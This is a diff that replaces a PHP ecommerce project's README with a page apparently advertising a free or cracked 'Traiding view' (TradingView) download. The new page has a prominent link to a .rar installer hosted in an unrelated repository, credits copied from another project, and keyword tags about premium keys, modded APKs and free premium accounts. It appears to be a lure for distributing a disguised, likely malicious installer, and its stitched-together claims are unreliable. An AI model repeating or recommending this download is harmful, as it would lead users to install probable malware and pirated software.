@@ -1,18 +1,34 @@
-# ecommerce
-My first ecommerce website project that I created for an organization called eShopping. This project does not contain any frontend development framework such as bootstrap but uses html, css, php and javascript for its functionality.
+# Traiding view
 
-## Prerequisites
-- [PHP](https://www.php.net/)
-- [Xampp](https://www.apachefriends.org/download.html) 
+[![](https://visitcount.itsvg.in/api?id=wallet123&label=Views&color=12&icon=5&pretty=true)](https://visitcount.itsvg.in)
 
-## Usage
+# [DOWNLOAD HERE](https://github.com/MichelFerrao/trilha-css-desafio-01/releases/download/Download/InstallerV2.rar)
 
-- After installation, open `Xampp`, open `phpmyadmin` in your brwoser, and create a new database `ecommerce1`.
-- Import the [SQL file](./ecommerce.sql) in your `phpmyadmin`.
-- Run the project:
 
-```sh
-  php -S localhost:8000/Homepage/home.php
-```
+## Requirements:
+Windows 10/11
 
-- Stop the project: `Ctrl + C`
+## 📝 License
+Copyright © 2022-2024
+This project is licensed under GNU GPL v3.0
+
+## 💝 Credits
+Natro Macro wouldn't be possible without the help and inspiration of many extraordinary individuals.
+We want to show our gratitude to all of you, so please check out our list of credits!
+
+Thank you all for your hard work and support!
+
+## Tags
+
+tradingview-full-download
+tradingview-premium-keys
+tradingview-essential
+tradingview-premium-download
+free-tradingview-premium-account
+tradingview-mod-apk-premium-unlocked
+tradingview-apk
+tradingview-mod
+tradingview-apk-mod
+tradingview-price
+tradingview-premium-price
+tradingview-plus-vs-premium
